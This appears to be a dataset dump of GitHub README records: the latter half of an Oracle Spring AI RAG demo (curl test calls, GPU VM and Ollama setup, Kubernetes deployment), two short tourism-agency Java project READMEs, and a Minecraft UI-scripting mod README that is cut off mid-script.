        //private final OllamaChatClient chatClient;

    ...

    //CHANGE
        @Autowired
        public DemoaiController(EmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // OpenAI full
        //public DemoaiController(OllamaEmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // Ollama Embeddings - OpenAI Completion 
        //public DemoaiController(OllamaEmbeddingClient embeddingClient, OllamaChatClient chatClient, VectorService vectorService) { // Ollama full 

```

VectorService.java:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaChatClient;
    ...
    //CHANGE
        private final ChatClient aiClient;
        //private final OllamaChatClient aiClient;

        //CHANGE
        VectorService(@Qualifier(""openAiChatClient"") ChatClient aiClient) {
        //VectorService(OllamaChatClient aiClient) {
```

DemoaiApplication.java:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaEmbeddingClient;

    ...
    //CHANGE
        @Bean
        VectorStore vectorStore(EmbeddingClient ec, JdbcTemplate t) {
        //VectorStore vectorStore(OllamaEmbeddingClient ec, JdbcTemplate t) {
            return new OracleDBVectorStore(t, ec); 
        }

```

### Pre document store

#### Generic chat

```bash
curl -X POST http://localhost:8080/ai/generate \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""What is a Generative AI?""}' | jq -r .generation
```

Here's a sample output from the command:

```
    Generative AI refers to artificial intelligence systems that are capable of creating new content, such as images, text, or music, based on patterns and examples provided to them. These systems use algorithms and machine learning techniques to generate realistic and original content that mimics human creativity. Generative AI can be used in a variety of applications, such as creating art, writing stories, or designing products.
```

#### RAG request without any data stored in the DB

```
curl -X POST http://localhost:8080/ai/rag \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""Can I use any kind of development environment to run the example?""}'
```

Output from the command:

```
    {
        ""generation"" : ""Based on the provided documents, it is not specified whether any kind of development environment can be used to run the example. Therefore, I'm sorry but I haven't enough information to answer.""
    }
```

### Search on data coming from a PDF stored

Store a PDF document in the DBMC 23c library: [**Oracle® Database: Get Started with Java Development**](https://docs.oracle.com/en/database/oracle/oracle-database/23/tdpjd/get-started-java-development.pdf) in the Oracle DB 23ai with embeddings coming from the OpenAI Embedding service. Dowload locally, and run in a shell:

```
curl -X POST -F ""file=@./docs/get-started-java-development.pdf"" http://localhost:8080/ai/store
```

**Note**: this process usually takes time because document will be splitted in hundreds or thousands of chunks, and for each one it will asked for an embeddings vector to OpenAI API service. In this case has been choosen a small document to wait a few seconds.

#### Q&A Sample

Let's look at some info in this document and try to query comparing the results with the actual content:

- **4.1.1 Oracle Database**

![dbtype](./img/dbtype.png)

```
curl -X POST http://localhost:8080/ai/rag \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""Which kind of database you can use to run the Java Web example application) ""}' | jq -r .generation
```

Response:

```
    You can use either Oracle Autonomous Database or Oracle Database Free available on OTN to run the Java Web example application.
```

- **4.1.5 Integrated Development Environment**

![ide](./img/ide.png)

```
curl -X POST http://localhost:8080/ai/rag \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""Can I use any kind of development environment to run the example?""}' | jq -r .generation
```

Response:

```
    Based on the information provided in the documents, you can use an Integrated Development Environment (IDE) like IntelliJ Idea community version to develop the Java application that connects to the Oracle Database. The guide specifically mentions using IntelliJ Idea for creating and updating the files for the application. Therefore, it is recommended to use IntelliJ Idea as the development environment for running the example.
```

- **4.2 Verifying the Oracle Database Installation**

![dbverify](./img/dbverify.png)

```
curl -X POST http://localhost:8080/ai/rag \
    -H ""Content-Type: application/json"" \
    -d '{""message"":""To run the example, how can I check if the dbms it is working correctly?""}' | jq -r .generation
```

Response:

```
    To check if the Oracle Database is working correctly, you can verify the installation by connecting to the database using the following commands:
    1. Navigate to the Oracle Database bin directory: $ cd $ORACLE_HOME/bin
    2. Connect to the database as sysdba: $ ./sqlplus / as sysdba

    If the connection is successful, you will see an output confirming that you are connected to the root container of the database. This indicates that the Oracle Database installation is working correctly. Additionally, you can download the Client Credentials for an ATP instance and verify the connection by following the steps provided in the documentation.
```

First, let's ask for a question not related to the document stored:

```
curl -X POST http://localhost:8080/ai/rag \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""How is the weather tomorrow?""}' | jq -r .generation
```

Response:

```
{
    ""generation"" : ""I'm sorry but I haven't enough info to answer.""
}
```

Then, let's test similarity search for message **""To run the example, how can I check if the dbms it is working correctly?""** example. The `top_k` parameter determines how many nearest chunks to retrieve is set to **4** by default, and the result set is by default in reverse order. So, we need to execute the fololwing command:

```
curl -X POST http://localhost:8080/ai/search-similar \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""To run the example, how can I check if the dbms it is working correctly?""}' | jq '.[3]'
```

Then, we test the deletion. Indexes begin counting at `1`, so let's execute the following command to delete occurrences 1, 4 and 5:

```
curl ""http://localhost:8080/ai/delete?id=1&id=5&id=4""
```

## 2. Running generations and chat with private LLMs through OLLAMA

We'll need to create an OCI Compute instance and install OLLAMA inside. Then, we will expose the server through an Internet Gateway and allow our Spring AI application connect to the OLLAMA server and make the equivalent requests as with OpenAI generations.

The following shape and images are recommended for the server: (it will require a GPU, as we'll be running an HPC load that will require lots of computing! More than the CPU can handle at this moment without quantization enabled.)

- Shape: `VM.GPU.A10.2` (2x NVIDIA A10 Tensor Cores)
- OCPU: 30
- GPU Memory: 48GB
- CPU Memory: 480GB
- Storage: >250GB
- Max Network Bandwidth: 48Gbps (6GBps)
- Image: Oracle Linux 8.9

1. From OCI console, choose Compute/Instances menu:

    ![image](./img/instance.png)

2. Press **Create instance** button:

    ![image](./img/create.png)

3. Choose `VM.GPU.A10.2` shape, selecting **Virtual machine**/**Specialty and previous generation**:

    ![image](./img/shape.png)

4. Choose the Image `Oracle-Linux-8.9-Gen2-GPU-2024.02.26-0` from Oracle Linux 8 list of images:

    ![image](./img/image.png)

5. Specify a custom boot volume size and set 100 GB:

    ![image](./img/bootvolume.png)

6. Create the image.

7. At the end of creation process, obtain the **Public IPv4 address**, and with your private key (the one you generated or uploaded during creation), connect to:

```
    ssh -i ./<your_private>.key opc@[GPU_SERVER_IP]
```

8. Install and configure docker to use GPUs:

```
    sudo /usr/libexec/oci-growfs
    curl -s -L https://nvidia.github.io/libnvidia-container/stable/rpm/nvidia-container-toolkit.repo |   sudo tee /etc/yum.repos.d/nvidia-container-toolkit.repo
    sudo dnf install -y dnf-utils zip unzip
    sudo dnf config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo
    sudo dnf remove -y runc
    sudo dnf install -y docker-ce --nobest
    sudo useradd docker_user
```

9. We need to make sure that your Operating System user has permissions to run Docker containers. To do this, we can run the following command:

```
sudo visudo
```

And add this line at the end:

```
docker_user  ALL=(ALL)  NOPASSWD: /usr/bin/docker
```

10. For convenience, we need to switch to our new user. For this, run:

```
sudo su - docker_user
```

11. Finally, let's add an alias to execute Docker with admin privileges every time we type `docker` in our shell. For this, we need to modify a file, depending on your OS (in `.bash_profile` (MacOS) / `.bashrc` (Linux)). Insert, at the end of the file, this command:

```
alias docker=""sudo /usr/bin/docker""
exit
```

12. We finalize our installation by executing:

```
sudo yum install -y nvidia-container-toolkit
sudo nvidia-ctk runtime configure --runtime=docker
sudo systemctl restart docker
nvidia-ctk runtime configure --runtime=docker --config=$HOME/.config/docker/daemon.json
```

13. If you're on Ubuntu instead, run:

```
sudo apt-get install nvidia-container-toolkit=1.14.3-1 \
        nvidia-container-toolkit-base=1.14.3-1 \
        libnvidia-container-tools=1.14.3-1 \
        libnvidia-container1=1.14.3-1
sudo apt-get install -y nvidia-docker2
```

13. Let's reboot and re-connect to the VM, and run again:

```
sudo reboot now
# after restart, run:
sudo su - docker_user
```

14. Run `docker` to check if everything it's ok.

15. Let's run a Docker container with the `ollama/llama2` model for embeddings/completion:

```
docker run -d --gpus=all -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama serve
docker exec -it ollama ollama pull nomic-embed-text
docker exec -it ollama ollama pull llama2:13b-chat-fp16
docker logs -f --tail 10 ollama
```

Both the model, for embeddings/completion will run under the same server, and they will be addressed providing in the REST request for the specific model required.

To handle the firewall, we need to open port `11434` on our Security List. For this, let's:

1. In **Instance details** click on the **Virtual cloud network:** link:

    ![securitylist](./img/vcn.png)

2. In the menu **Resources** click on **Security Lists**:

    ![security](./img/securitylist.png)

3. Click on the link of **Default Security List...**

4. Click on the **Add Ingress Rules** button:

    ![security](./img/addIngress.png)

5. Click on the **Add Ingress Rules** button:

    ![security](./img/addIngress.png)

6. Insert details as shown in the following image and then click **Add Ingress Rules** button:

    ![security](./img/rule.png)

7. Update the `env.sh` file and run `source ./env.sh`:

```
#export OPENAI_URL=http://[GPU_SERVER_IP]:3000
export OPENAI_URL=https://api.openai.com
#export OPENAI_MODEL=NousResearch--llama-2-7b-chat-hf
export OPENAI_MODEL=gpt-3.5-turbo
export OPENAI_EMBEDDING_MODEL=text-embedding-ada-002
export VECTORDB=[VECTORDB_IP]
export DB_USER=vector
export DB_PASSWORD=vector
export OLLAMA_URL=http://[GPU_SERVER_IP]:11434
export OLLAMA_EMBEDDINGS=NousResearch--llama-2-7b-chat-hf
export OLLAMA_MODEL=llama2:7b-chat-fp16
export OPENAI_API_KEY=[YOUR_OPENAI_KEY]
```

8. Test with a shell running:

```
curl ${OLLAMA_URL}/api/generate -d '{
        ""model"": ""llama2:7b-chat-fp16"",
        ""prompt"":""Why is the sky blue?""
}'
```

You'll receive the response in continuous sequential responses, facilitating the delivery of the content little by little, instead of forcing users to wait for the whole response to be generated before it's desplayed to them.

### Customize for private LLMs: Vector Embeddings local, Open AI for Completion

* pom.xml: uncomment the ollama dependency:

```
    <!--//CHANGE-->	
	<!-- Ollama for embeddings -->
		<dependency>
			<groupId>org.springframework.ai</groupId>
			<artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
		 </dependency>
	 	<!--  -->
```

* DemoaiController.java - uncomment with final source code:

```
    //CHANGE
    import org.springframework.ai.ollama.OllamaEmbeddingClient;
    //import org.springframework.ai.ollama.OllamaChatClient;
...

    //CHANGE
    //private final EmbeddingClient embeddingClient;
    private final OllamaEmbeddingClient embeddingClient;

    //CHANGE
    private final ChatClient chatClient;
    //private final OllamaChatClient chatClient;
...

    //CHANGE
    //public DemoaiController(EmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // OpenAI full
    public DemoaiController(OllamaEmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // Ollama Embeddings - OpenAI Completion 
    //public DemoaiController(OllamaEmbeddingClient embeddingClient, OllamaChatClient chatClient, VectorService vectorService) { // Ollama full 
        

```

VectorService.java - check if it's like this:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaChatClient;

    ...

    //CHANGE
        private final ChatClient aiClient;
        //private final OllamaChatClient aiClient;

        //CHANGE
        VectorService(@Qualifier(""openAiChatClient"") ChatClient aiClient) {
        //VectorService(OllamaChatClient aiClient) {

```

Test as done before. In the gpu docker logs, you'll see the chunks coming to be embedded.

### Full private LLMs with `llama2:7b-chat-fp16`

DemoaiController.java - uncomment with final source code:

```
    //CHANGE
    import org.springframework.ai.ollama.OllamaEmbeddingClient;
    import org.springframework.ai.ollama.OllamaChatClient;

    ...
        //CHANGE
        //private final EmbeddingClient embeddingClient;
        private final OllamaEmbeddingClient embeddingClient;

        //CHANGE
        //private final ChatClient chatClient;
        private final OllamaChatClient chatClient;
    ...


    //CHANGE
        @Autowired
        //public DemoaiController(EmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // OpenAI full
        //public DemoaiController(OllamaEmbeddingClient embeddingClient, @Qualifier(""openAiChatClient"") ChatClient chatClient, VectorService vectorService) {  // Ollama Embeddings - OpenAI Completion 
        public DemoaiController(OllamaEmbeddingClient embeddingClient, OllamaChatClient chatClient, VectorService vectorService) { // Ollama full 
        

```

VectorService.java - uncomment with final source code:

```
    //CHANGE
    import org.springframework.ai.ollama.OllamaChatClient;

    ...


        //CHANGE
        //private final ChatClient aiClient;
        private final OllamaChatClient aiClient;

        //CHANGE
        //VectorService(@Qualifier(""openAiChatClient"") ChatClient aiClient) {
        VectorService(OllamaChatClient aiClient) {
```

Test as before. Now, you could see a tiny degradation of quality (since the model is quite small), mantaining the same embeddings and context retrieval. For example, with the question:

```
    Q: Which kind of database you can use to run the Java Web example application:
    A: The document states that the application uses Oracle JDBC Thin driver, Universal Connection Pool (UCP), and Java in the Database (using embedded OJVM). Therefore, you can use an Oracle database to run the Java Web example application.
```

This first result doesn't return a very good, personalized result. However, if we  good. But for:

```
    Q: Can I use any kind of development environment to run the example?
    A: the user can use any development environment to run the example as long as it has a Java compiler and a database manager installed. The DOCUMENTS text does not specify any particular IDE that must be used, so any IDE with Java development capabilities should work. However, the guide does recommend using IntelliJ Idea Community Edition for ease of development, but this is not a requirement.\n\nTo answer the user's question, you could say: \""Yes, you can use any development environment to run the example as long as it has a Java compiler and a database manager installed. While the guide recommends using IntelliJ Idea Community Edition for ease of development, any IDE with Java development capabilities should work.\
```

The result is more customized and acceptable.

This trade-off in using private LLMs model could be overcome choosing *larger models*, enough to mantain a good quality.

> **Note**: the number of billions of parameters of a model version usually has a direct correlation with the size of the model, and its generation quality. The higher, the better, although you also need to watch out for OOM (out of memory) errors and a slower generation throughput.

## 3. Deploy on Oracle Backend for Spring Boot and Microservices

Let's show what Oracle can offer to deploy on an enterprise grade the GenAI application developed so far.

The platform [**Oracle Backend for Spring Boot and Microservices**](https://oracle.github.io/microservices-datadriven/spring/) allows developers to build microservices in Spring Boot and provision a backend as a service with the Oracle Database and other infrastructure components that operate on multiple clouds. This service vastly simplifies the task of building, testing, and operating microservices platforms for reliable, secure, and scalable enterprise applications.

To setup this platform, follow the instruction included in **Lab1: Provision an instance** and **Lab 2: Setup your Development Environment** of the [LiveLabs: CloudBank - Building an App with Spring Boot and Mobile APIs with Oracle Database and Kubernetes](https://apexapps.oracle.com/pls/apex/f?p=133:180:7384418726808::::wid:3607). At the end, proceed with the following steps:

1. In the `application.properties` change the active env as `prod`:

```
spring.profiles.active=prod
```

2. In the `application-prod.properties`, change the parameters in `< >` with the values set in `env.sh`:

```
    spring.ai.openai.api-key=<OPENAI_API_KEY>
    spring.ai.openai.base-url=<OPENAI_URL>
    spring.ai.openai.chat.options.model=gpt-3.5-turbo
    spring.ai.openai.embedding.options.model=text-embedding-ada-002
    spring.datasource.url=jdbc:oracle:thin:@<VECTORDB>:1521/ORCLPDB1
    spring.datasource.username=vector
    spring.datasource.password=vector
    spring.datasource.driver-class-name=oracle.jdbc.OracleDriver
    config.tempDir=tempDir
    config.dropDb=true
    config.vectorDB=vectortable
    config.distance=EUCLIDEAN
    spring.servlet.multipart.max-file-size=10MB
    spring.servlet.multipart.max-request-size=20MB
    spring.ai.ollama.base-url=<OLLAMA_URL>
    spring.ai.ollama.embedding.options.model=nomic-embed-text
    spring.ai.ollama.chat.options.model=llama2:7b-chat-fp16
```

3. Open a terminal, and using the **Kubernetes** admin command, open a port forward to the backend:

```
kubectl -n obaas-admin port-forward svc/obaas-admin 8080:8080
```

4. Using the command-line tool `oractl`, deploy the application running the following commands:

```
oractl:>connect
? username obaas-admin
? password **************

oractl:>create --app-name rag
oractl:>deploy --app-name rag --service-name demoai --artifact-path /Users/cdebari/Documents/GitHub/spring-ai-demo/target/demoai-0.0.1-SNAPSHOT.jar --image-version 0.0.1 --service-profile prod

```

5. Let's test the application with port forwarding. First, we need to stop the current `demoai` instance running on the background, to free the previous port being used; and, in a different terminal, run a port forwarding on port 8080 to the remote service on the **Oracle Backend for Spring Boot and Microservices**:

```
kubectl -n rag port-forward svc/demoai 8080:8080
```

6. In a different terminal, test the service as done before, for example:

```
curl -X POST http://localhost:8080/ai/rag \
        -H ""Content-Type: application/json"" \
        -d '{""message"":""Can I use any kind of development environment to run the example?""}' | jq -r .generation
```

## Notes/Issues

Additional Use Cases like summarization and embedding coming soon.

## URLs

- [Oracle AI](https://www.oracle.com/artificial-intelligence/)
- [AI for Developers](https://developer.oracle.com/technologies/ai.html)

## Contributing

This project is open source.  Please submit your contributions by forking this repository and submitting a pull request!  Oracle appreciates any contributions that are made by the open-source community.

## License

Copyright (c) 2024 Oracle and/or its affiliates.

Licensed under the Universal Permissive License (UPL), Version 1.0.

See [LICENSE](LICENSE) for more details.

ORACLE AND ITS AFFILIATES DO NOT PROVIDE ANY WARRANTY WHATSOEVER, EXPRESS OR IMPLIED, FOR ANY SOFTWARE, MATERIAL OR CONTENT OF ANY KIND CONTAINED OR PRODUCED WITHIN THIS REPOSITORY, AND IN PARTICULAR SPECIFICALLY DISCLAIM ANY AND ALL IMPLIED WARRANTIES OF TITLE, NON-INFRINGEMENT, MERCHANTABILITY, AND FITNESS FOR A PARTICULAR PURPOSE.  FURTHERMORE, ORACLE AND ITS AFFILIATES DO NOT REPRESENT THAT ANY CUSTOMARY SECURITY REVIEW HAS BEEN PERFORMED WITH RESPECT TO ANY SOFTWARE, MATERIAL OR CONTENT CONTAINED OR PRODUCED WITHIN THIS REPOSITORY. IN ADDITION, AND WITHOUT LIMITING THE FOREGOING, THIRD PARTIES MAY HAVE POSTED SOFTWARE, MATERIAL OR CONTENT TO THIS REPOSITORY WITHOUT ANY REVIEW. USE AT YOUR OWN RISK.
",springai-rag-db23ai,,2024-04-23T13:57:46Z,2024-07-23T21:07:46Z,,0,59,4,19,0,3,13,3,6,UPL-1.0,Java
Seyma000/TourismAgency-main,master,"﻿# Tourism Agency Management System
This project covers a Java Swing application developed to manage the operations of tourism agencies. n-layer architecture is used. The project consists of five main packages: DAO (Data Access Object), Business, Entity, Core and View.

# About the project
The tourism agency project is an application that provides hotel management, room reservations, customer information and user management. It includes adding hotels, managing rooms, making reservations and updating customer information. Users are created in different roles such as admin and employee, allowing business processes to be managed more effectively. As a result, the tourism agency project provides services by facilitating travel and accommodation processes.

# Project Demo Video
https://youtu.be/Pp9rCfY3RKo

# Features
## Hotel Management
You can add new hotels.
View and edit existing hotels.
Update and delete hotel information.
## Room Management
You can add new rooms to a hotel.
View and edit existing rooms.
Update and delete room information.
## Reservation Management
Make reservations and view them.
Update and delete reservation information.
## User Management
Add new users and view existing ones.
Update and delete user information.
Assign ""admin"" and ""employee"" roles to users.
## Example Use Cases
Adding a New Hotel: Click the ""Add Hotel"" button on the main screen to add a new hotel. Visit the ""Hotel List"" tab to see the added hotels.

Adding a New Room: From the ""Add Room"" tab, you can add a new room to an existing hotel.

Making a Reservation: Choose a suitable hotel from the ""Make Reservation"" tab to make a reservation.

User Creation: Create a new user from the ""Users"" tab and assign either an ""admin"" or ""employee"" role to the user.

Reservation Update/Delete: In the ""Reservations"" tab, you can view, update, or delete existing reservations.

## Project Structure
The project is comprised of five main packages:

dao Layer: Data Access Objects managing database operations.

business Layer: Classes containing business logic operations.

entity Layer: Entity classes representing database tables.

core Layer: Fundamental helper classes and tools.

view Layer: Classes containing Swing User Interface (UI) components.

## Requirements
Java JDK 8 or above
PostgreSQL database
",,,2024-04-21T20:04:00Z,2024-04-23T21:36:58Z,,0,2,0,3,0,0,13,1,0,,Java
beyzanrkeskinnn/Tourism_Agency_System,master,"#  Turizm Acente Sistemi

Bu proje, Turizm Acentesi'nin işlerini dijital ortamda yönetmesini sağlayan bir yazılım sistemini içerir. Bu sistem, otel sektöründe faaliyet gösteren işletmenin günlük operasyonlarını etkili bir şekilde yönetmeyi ve müşteri rezervasyon süreçlerini optimize etmeyi amaçlamaktadır.

## Özellikler

- Admin ve acente çalışanı olmak üzere iki farklı kullanıcı türü bulunmaktadır.
- Admin, kullanıcı yönetimi işlemlerini gerçekleştirebilir.
- Acente çalışanları otel, oda ve dönem yönetimi yapabilir, fiyatlandırma işlemleri gerçekleştirebilir ve rezervasyon işlemleri yapabilir.
- Sistem, otel ve oda özelliklerine göre esnek fiyatlandırma sunar.
- Acente çalışanları, müşteri taleplerine göre oda arama işlemleri gerçekleştirebilir ve rezervasyonları yönetebilir.

## Kullanıcı Yönetimi

- Admin, sisteme erişecek kullanıcıları ekleyebilir, düzenleyebilir, silebilir rollere göre filtreleme yapabilir.
- Admin, kullanıcıların rollerini (admin, personel) belirleyebilir.
## Otel Yönetimi
- Acente çalışanları, otelleri sisteme ekleyebilir, düzenleyebilir ve silebilir.
- Her otel için konum bilgileri, iletişim bilgileri ve diğer özellikler kaydedilebilir.
- 
## Dönem Yönetimi
- Acente çalışanları, otellere ait dönemleri sisteme ekleyebilir ve yönetebilir.
## Pansiyon Yönetimi
- Acente çalışanları, otellere ait pansiyonları sisteme ekleyebilir ve yönetebilir.

## Oda Yönetimi
- Acente çalışanları, otellerdeki odaları sisteme ekleyebilir, düzenleyebilir ve silebilir.
- Oda özellikleri ve fiyatlandırma işlemleri gerçekleştirilebilir.

## Oda Arama ve Rezervasyon İşlemleri
- Acente çalışanları, müşteri taleplerine göre odaları arayabilir ve rezervasyon işlemlerini gerçekleştirebilir.
- Rezervasyon işlemleri sırasında toplam fiyat otomatik olarak hesaplanır ve ilgili odanın stoku güncellenir.
 


  Projenin kullanımı ile ilgili detayları [tanıtım linki ]( https://youtu.be/45t2tLTayeY)tanıtım linki üzerinden inceleyebilirsiniz.
 ",Patika Tourism Agency System,,2024-04-24T13:22:51Z,2024-04-24T13:19:55Z,,0,2,0,2,0,0,12,1,0,,Java
ItziSpyder/ImproperUI,main,"# ImproperUI
The ultimate solution to Minecraft Rendering being too hard to learn.

---

### Introduction
Unlike my other project, ClickCrystals Script, ImproperUI Script requires you to have prior knowledge of 

- Basic CSS properties and how they work
- Basic HTML structures
- Java

ImproperUI's syntax is highly inspired by CSS (Cascading Style Sheets), thought it is not entirely identical.

Below is a screenshot of an interactive screen with draggable and scrollable elements as the home page of the mod.
This screen is scripted using ImproperUI Script:

![demo](./assets/demo.png)

### Recent Changes
```yml
Version: 0.0.6-BETA

Added:
  - added ConfigReader
  - added ImproperUIAPI.getConfigReader()

Patches:
  - fixed config integer args not parsing properly
```

### Adding ImproperUI to your Project
To add ImproperUI, you download it as a jar and then add it to gradle manually.
I didn't want to create an online repository and I didn't want to make it a separate mod. Womp Womp.

[Here](https://github.com/ItziSpyder/CrosshairTarget) is an example of how ImproperUI can be used in a mod!

#### Step 1
[Download the jar](https://github.com/ItziSpyder/ImproperUI/releases/latest) and add it to your project files, as well as build.gradle as a dependency.
```gradle
dependencies {
    compileOnly files(""libs/ImproperUI-theVersionYouWant.jar"")
}
```

#### Step 2
Add the downloaded jar, as a mod, to your mods folder! You have to this use this a library!

#### Step 3 (Final Step)
Initialize the API. In this section, you call the init() function on ImproperUIAPI, then
provide:
- the `modId` your YOUR mod
- the `main class mod initializer` of YOUR mod
- then finally a list of script paths inside the `src/main/resources/` folder of YOUR mod.
- by convention, you should create your scripts inside of `src/main/resources/assets/YOURMODID/improperui/` folder

```java
public class ImproperUI implements ModInitializer {

    @Override
    public void onInitialize() {
        ImproperUIAPI.init(""improperui"", ImproperUI.class,
                ""assets/improperui/improperui/what.ui"",
                ""assets/improperui/improperui/screen.ui""
        );
    }
}
```
```java
public class YourModInitializer implements ModInitializer {

    @Override
    public void onInitialize() {
        ImproperUIAPI.init(""yourModId"", YourModInitializer.class,
                ""assets/yourModId/improperui/yourscreen1.ui"",
                ""assets/yourModId/improperui/yourscreen2.ui""
        );
    }
}
```
**DO NOTE THAT WHEN YOU ACTUALY TRY TO PARSE OR RUN THE SCRIPTS, YOU REFERENCE THE SCRIPT FILE'S NAME NOT THE PATH DECLARED HERE!**

<br>

### Events
To listen to events declared from your script, create a new class that implements `CallbackListener`.

Create a method that 

1. Has annotation `CallbackHandler`
2. Has parameter that contains the type of event you want to listen for
3. The name of the method should match the declared event from your script

```java
public class CustomCallbacks implements CallbackListener {
    
    @CallbackHandler
    public void sendHelloWorld(MouseEvent e) {
        if (e.input.isDown())
            ChatUtils.sendMessage(""Hello World"");
    }
}
```

In your script, the event should look like this:

```
element {
    on-click: sendHelloWorld
}
```

Finally, when you declare a `ImproperUIPanel` screen, register the callback to your panel:

```java
public void openScreen() {
    ImproperUIPanel panel = new ImproperUIPanel();
    panel.registerCallback(new CustomCallback());
    // parse script and add children elements here
    // panel.addChild()
    panel.open();
}
```

If you are running a script, provide your custom callback in the creation arguments:

```java
public void openScreen() {
    ImproperUIAPI.parseAndRunFile(""yourModId"", ""testing.ui"", new CustomCallback() /* and more... */);
}
```

<br>

### Helper Methods
```yml
Helper Methods:
  - ImproperUIPanel.collect() // a list of all elements and widgets, even their children
  - ImproperUIPanel.collectOrdered() // a sorted list based on z-index, of all elements and widgets including their children
  - ImproperUIPanel.collectById() // a list of elements with specified ID
  - ImproperUIPanel.collectByClassAttribute() // a list of elements with specified class attribute
  - ImproperUIPanel.collectFirstById() // first element with specified ID
  - ImproperUIPanel.collectFirstByClassAttribute() // first element with specified class attribute

API:
  - ImproperUIAPI.parse() // parses a script then returns all parsed result elements
  - ImproperUIAPI.parseAndRunFile() // parses a registered script file NAME (NOT PATH) from init() and opens the screen with the elements 
  - ImproperUIAPI.parseAndRunScript() // parses a registered script from init() and opens the screen with the elements
  - ImproperUIAPI.reload() // reloads the API
```

<br>

### Config Keys
A config key consists of three parts: `modId, confileFile, propertyName`. They are used for
saving configuration values for, let's say, your sliders and checkboxes. 

To use a config key in your script, simply type out all three parts **WITH NO SPACES AND SEPARATED BY A COLON (:)**.
Then use that string as an attribute class for the element:

```txt
slider #someId -yourModId:config.properties:testing-slider-value -someAnotherAttributeClass {
    
}
```
This creates a slider that sets and saves values do the config.

<br>

### Tags
| Element Tag  | Dynamic Hover, Select, Focus | Children Support | Config Support | Aliases   | Specific Properties: type                                                     |
|--------------|------------------------------|------------------|----------------|-----------|-------------------------------------------------------------------------------|
| element      | ✅                            | ✅                | ✅              | e, div    |                                                                               |
| checkbox     | ✅                            | ❌                | ✅              |           | active:boolean                                                                |
| radio        | ✅                            | ❌                | ✅              |           | active:boolean                                                                |
| button       | ✅                            | ❌                | ❌              |           |                                                                               |
| link         | ✅                            | ❌                | ❌              | a         | href:string                                                                   |
| slider       | ❌                            | ❌                | ✅              |           | min:double max:double value:double range:double,double decimal-places:integer |
| input        | ❌                            | ❌                | ✅              | textbox   | pattern:quote placeholder:quote                                               |
| textfield    | ❌                            | ❌                | ✅              | textarea  |                                                                               |
| label        | ✅                            | ❌                | ❌              | textlabel |                                                                               |
| header1      | ✅                            | ❌                | ❌              | h1        |                                                                               |
| header2      | ✅                            | ❌                | ❌              | h2        |                                                                               |
| header3      | ✅                            | ❌                | ❌              | h3        |                                                                               |
| header4      | ✅                            | ❌                | ❌              | h4        |                                                                               |
| header5      | ✅                            | ❌                | ❌              | h5        |                                                                               |
| header6      | ✅                            | ❌                | ❌              | h6        |                                                                               |
| positionable | ✅                            | ✅                | ✅              |           |                                                                               |


<br>

### This Project is Never Complete
So pull request your ideas!
Star us to receive latest interesting updates/pull requests!

<br>
<br>
<br>
<br>
<br>

Liked the home screen? This is the script!
```
div #background-gradient {
    size: 100%
    margin-top: 100%
    shadow-distance: 50%
    shadow-color: #9775a6
}

div #display {
    size: 420 240
    center: both
    border-radius: 10
    border-thickness: 1
    border-color: #412752
    background-color: #2d162c
    shadow-distance: 5
    shadow-color: #683a68

    child-align: grid
    grid-columns: 1

    div #title {
        inner-text: ""ImproperUI Interactives""
        size: 100% 10
        text-align: center
        text-scale: 1.69
        text-color: #9775a6
        background-color: none
        margin-top: 15
    }

    div #motto {
        inner-text: ""We got CSS in Minecraft before GTA 6""
        size: 100% 10
        text-align: center
        text-scale: 0.8
        background-color: none
        margin-top: 10
    }
    div #motto {
        inner-text: ""The Ultimate Solution To Minecraft Rendering Being Too Difficult""
        size: 100% 10
        text-align: center
        text-scale: 0.8
        background-color: none
        margin-bottom: 10
    }

    div #navbar {
        size: 100% 15
        margin-top: 10
        background-color: none

        child-align: grid
        grid-columns: 100

        button #discord {
            inner-text: ""Discord""
            background-color: #9775a6
            border-radius: 0
            margin: 0
            width: 20%
            padding-left: 0
            padding-right: 0

            on-click: openDiscord

            hovered => { padding: 3; border-thickness: 0; border-radius: 2; shadow-distance: 2; }
        }
        button #github {
            inner-text: ""GitHub""
            background-color: #9775a6
            border-radius: 0
            margin: 0
            width: 20%
            padding-left: 0
            padding-right: 0

            on-click: openGithub

            hovered => { padding: 3; border-thickness: 0; border-radius: 2; shadow-distance: 2; }
        }
        button #modrinth {
            inner-text: ""Modrinth""
            background-color: #9775a6
            border-radius: 0
            margin: 0
            width: 20%
            padding-left: 0
            padding-right: 0

            on-click: openModrinth

            hovered => { padding: 3; border-thickness: 0; border-radius: 2; shadow-distance: 2; }
        }
        button #wiki {
            inner-text: ""Wiki""
            background-color: #9775a6
            border-radius: 0
            margin: 0
            width: 20%
            padding-left: 0
            padding-right: 0

            on-click: openWiki

            hovered => { padding: 3; border-thickness: 0; border-radius: 2; shadow-distance: 2; }
        }
        button #wiki {
            inner-text: ""Example""
            background-color: #9775a6
            border-radius: 0
            margin: 0
            width: 20%
            padding-left: 0
            padding-right: 0

            on-click: openExampleScreen

            hovered => { padding: 3; border-thickness: 0; border-radius: 2; shadow-distance: 2; }
        }
    }

    div #mini-world {
        size: 100% 140
        background-color: none

        child-align: grid
        grid-columns: 21

        scrollable: true
        background-clip: padding

        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
        div #block { background-image: textures/block/ice.png; size: 20; draggable: true; hovered => { border-thickness: 1; border-color: white; } }
